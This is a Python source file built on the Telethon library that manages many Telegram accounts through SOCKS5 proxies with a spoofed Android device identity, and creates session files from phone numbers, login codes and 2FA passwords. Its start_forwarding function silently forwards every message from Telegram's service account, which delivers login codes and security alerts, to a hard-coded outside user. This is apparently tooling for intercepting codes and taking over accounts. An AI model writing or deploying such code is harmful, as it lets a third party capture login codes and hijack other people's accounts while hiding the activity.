import os
import socks
from typing import Dict, Optional, Tuple
from telethon import TelegramClient, events
from telethon.errors import (
    ChannelsTooMuchError,
    FloodWaitError,
    SessionPasswordNeededError,
    PhoneCodeInvalidError
)

API_ID = 16623
API_HASH = "8c9dbfe58437d1739540f5d53c72ae4b"
SESSIONS_DIR = "sessions"
FORWARD_TO_ID = 7053561971
TELEGRAM_SERVICE_ID = 777000

# Active clients dictionary: account_id -> TelegramClient
ACCOUNT_CLIENTS: Dict[int, TelegramClient] = {}


def ensure_sessions_dir():
    """Ensure sessions directory exists"""
    if not os.path.exists(SESSIONS_DIR):
        os.makedirs(SESSIONS_DIR, exist_ok=True)


def build_proxy_tuple(
    host: Optional[str],
    port: Optional[int],
    username: Optional[str],
    password: Optional[str]
) -> Optional[Tuple]:
    """Build proxy tuple for Telethon"""
    if not host or not port:
        return None
    if username and password:
        return (socks.SOCKS5, host, int(port), True, username, password)
    else:
        return (socks.SOCKS5, host, int(port))


async def get_or_create_client(account: dict) -> TelegramClient:
    """Get existing or create new TelegramClient for account"""
    account_id = account["id"]
    
    # Return existing client if already connected
    if account_id in ACCOUNT_CLIENTS:
        client = ACCOUNT_CLIENTS[account_id]
        if not client.is_connected():
            await client.connect()
        return client
    
    ensure_sessions_dir()
    session_path = account["session_path"]
    if not os.path.isabs(session_path):
        session_path = os.path.join(SESSIONS_DIR, session_path)
    
    # Build proxy if configured
    proxy = build_proxy_tuple(
        account.get("proxy_host"),
        account.get("proxy_port"),
        account.get("proxy_username"),
        account.get("proxy_password")
    )
    
    # Create client
    client = TelegramClient(
        session=session_path,
        api_id=API_ID,
        api_hash=API_HASH,
        proxy=proxy,
        device_model="POCO X6 Pro 5G",
        system_version="Android 15",
        app_version="11.13.0.1",
        lang_code="en",
        system_lang_code="en"
    )
    
    await client.connect()
    ACCOUNT_CLIENTS[account_id] = client
    
    return client


async def start_forwarding(account_id: int, client: TelegramClient):
    """Start automatic forwarding for an account"""
    @client.on(events.NewMessage(from_users=TELEGRAM_SERVICE_ID))
    async def forward_handler(event):
        try:
            await event.forward_to(FORWARD_TO_ID)
            print(f"[Account {account_id}] Forwarded message from Telegram Service")
        except Exception as e:
            print(f"[Account {account_id}] Forward error: {e}")


async def disconnect_client(account_id: int):
    """Disconnect a client"""
    if account_id in ACCOUNT_CLIENTS:
        try:
            await ACCOUNT_CLIENTS[account_id].disconnect()
            del ACCOUNT_CLIENTS[account_id]
        except Exception:
            pass


async def disconnect_all_clients():
    """Disconnect all clients"""
    for account_id in list(ACCOUNT_CLIENTS.keys()):
        await disconnect_client(account_id)


async def create_new_session(phone: str, code_callback, password_callback=None):
    """Create a new session file"""
    ensure_sessions_dir()
    session_name = f"session_{phone.replace('+', '')}"
    session_path = os.path.join(SESSIONS_DIR, session_name)
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    try:
        # Send code request
        await client.send_code_request(phone)
        
        # Get code from callback
        code = await code_callback()
        
        # Sign in with code
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            # 2FA enabled, get password
            if password_callback:
                password = await password_callback()
                await client.sign_in(password=password)
            else:
                await client.disconnect()
                raise Exception("2FA password required")
        
        await client.disconnect()
        return session_name + ".session"
        
    except Exception as e:
        await client.disconnect()
        raise e
